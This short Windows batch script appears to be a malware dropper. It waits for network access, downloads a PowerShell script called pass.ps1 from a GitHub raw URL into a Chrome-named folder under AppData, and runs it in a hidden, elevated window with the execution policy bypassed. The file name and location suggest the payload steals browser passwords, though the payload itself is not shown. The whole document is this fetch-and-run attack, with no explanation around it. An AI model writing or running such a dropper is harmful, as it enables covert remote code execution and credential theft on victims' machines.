@echo off
:while
ping www.google.com -n 1 | find "TTL="
IF %ERRORLEVEL% EQU 0 ( goto :run ) else ( goto :while )

:run
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pass.ps1' -OutFile $env:appdata\Chrome\pass.ps1"
timeout /t 7
powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Chrome\pass.ps1' -WindowStyle Hidden -Verb RunAs"
